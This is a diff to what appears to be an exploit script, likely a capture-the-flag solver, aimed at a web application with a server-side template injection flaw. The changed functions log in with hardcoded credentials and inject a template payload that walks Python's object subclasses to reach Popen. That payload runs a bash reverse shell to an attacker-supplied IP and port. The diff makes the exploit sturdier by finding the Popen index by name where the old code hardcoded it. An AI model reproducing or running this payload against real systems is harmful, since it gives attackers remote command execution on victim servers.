@@ -69,7 +69,7 @@ def web_render(session, uid, part_1, part_2):
     return answer
 
 
-def web_subclasses():
+def web_find_subclass(name):
     uid = 'ps'
     pwd = 'KramBamBuli'
 
@@ -84,8 +84,7 @@ def web_subclasses():
     answer = web_render(session, uid, part_1, part_2)
     subclasses = [a.strip() for a in answer.split('\n')]
 
-    for i, subclass in enumerate(subclasses):
-        print(f'{i}: {subclass}')
+    return subclasses.index(name) if name in subclasses else None
 
 
 def web_reverse_shell(remote_attacker_ip, remote_attacker_port):
@@ -97,12 +96,17 @@ def web_reverse_shell(remote_attacker_ip, remote_attacker_port):
 
     web_login(session, uid, pwd, f'/profile/{uid}')
 
-    part_1 = f"{{{{''.__class__.mro()[1].__subclasses__()[655](['/bin/bash','-c',"
+    popen_index = web_find_subclass('Popen')
+    assert popen_index
+
+    log.debug(f"Found Popen: ''.__class__.mro()[1].__subclasses__()[{popen_index}]")
+
+    part_1 = f"{{{{''.__class__.mro()[1].__subclasses__()[{popen_index}](['/bin/bash','-c',"
     part_2 = f"'/bin/bash -i >& /dev/tcp/{remote_attacker_ip}/{remote_attacker_port} 0>&1'])}}}}"
 
     answer = web_render(session, uid, part_1, part_2)
 
-    log.info(answer)
+    log.debug(answer)
 
 
 def web_run_py_file(io, filepath, args=(), exit=True):
